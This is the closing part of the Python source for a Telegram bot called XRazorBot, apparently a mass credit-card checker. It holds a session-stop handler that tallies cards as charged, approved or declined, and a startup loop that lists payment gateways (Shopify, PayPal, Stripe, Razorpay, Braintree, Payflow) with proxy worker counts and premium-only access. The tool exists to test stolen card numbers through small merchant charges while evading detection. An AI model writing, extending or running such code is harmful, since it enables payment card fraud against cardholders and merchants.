        sess_data   = active_sessions[session_key]
        results     = sess_data.get('results', {})
        uid         = sess_data.get('user_id', user_id)
        elapsed     = time.time() - results.get('start_time', time.time())
        gateway     = results.get('last_gateway', 'Unknown')
        command     = results.get('command', 'Mass').lstrip('/')
        total       = results.get('total', 0)
        checked     = results.get('checked', 0)
        charged     = len(results.get('charged', []))
        approved    = len(results.get('approved', []))
        declined    = len(results.get('dead', []))
        plan_badge  = get_plan_badge({'id': uid})
        try:
            sender     = await event.get_sender()
            first_name = sender.first_name or "User"
        except:
            first_name = "User"
        del active_sessions[session_key]
        await event.answer("✋ Stopped")
        msg = (
            f"<blockquote>✦ ${command} | ~ XRazorBot ✦</blockquote>\n"
            f"[⚬] Gateway: {gateway}\n"
            f"[⚬] Total Cards: {total}\n"
            f"[⚬] Checked: {checked}\n"
            f"[⚬] Status: Stopped ✋\n"
            f"[ﾒ] T/t: {elapsed:.1f} [ 𝐬]\n"
            f"[ﾒ] Checked By: {first_name} [{plan_badge}]"
        )
        buttons = [
            [Button.inline(f"Charged ↬ [{charged}] 💎", b"mass_noop"), Button.inline(f"Approved ↬ [{approved}] ✅", b"mass_noop")],
            [Button.inline(f"Declined ↬ [{declined}] ❌", b"mass_noop"), Button.inline("Stopped 🖐️", b"mass_noop")],
        ]
        await event.edit(premium_emoji(msg), buttons=buttons, parse_mode='html')
    else:
        await event.answer("No active session", alert=True)

# ================== START BOT ==================
def main():
    while True:
        try:
            print("✅ Bot started successfully! (Shopify + PayPal $1 + PayPal2 + Stripe Auth + Stripe Donation + Razorpay + Stripe $5 + Braintree + Payflow $18)")
            print("⚠️  Shopify mass: Proxy and No Proxy modes both use 10 workers for all users.")
            print("⚠️  Stripe Auth mass uses 4 workers (both proxy and no proxy).")
            print("⚠️  Stripe $5 mass: Proxy mode 10 workers, No Proxy mode owner only.")
            print("⚠️  Razorpay mass: Proxy mode 5 workers, No Proxy mode owner only (max 15 cards).")
            print("⚠️  Payflow $18 mass: Proxy mode 8 workers, No Proxy mode owner only (max 100 cards).")
            print("⚠️  PayPal $1 mass: Proxy mode 12 workers, No Proxy mode owner only (max 100 cards).")
            print("⚠️  Only premium users and owner can use the bot. Free users are forbidden.")
            print("✅ /tap command: Reply to .txt file to add alive proxies.")
            print("✅ New commands: /rz, /trz, /st, /tst, /bt, /pf, /tpf, /pp, /mpp")
            bot.run_until_disconnected()
            break
        except Exception as e:
            print(f"❌ Bot crashed: {type(e).__name__}: {e}", flush=True)
            traceback.print_exc()
            try:
                bot.disconnect()
            except Exception:
                pass
            print("🔄 Restarting bot in 10 seconds...", flush=True)
            time.sleep(10)

if __name__ == '__main__':
    main()
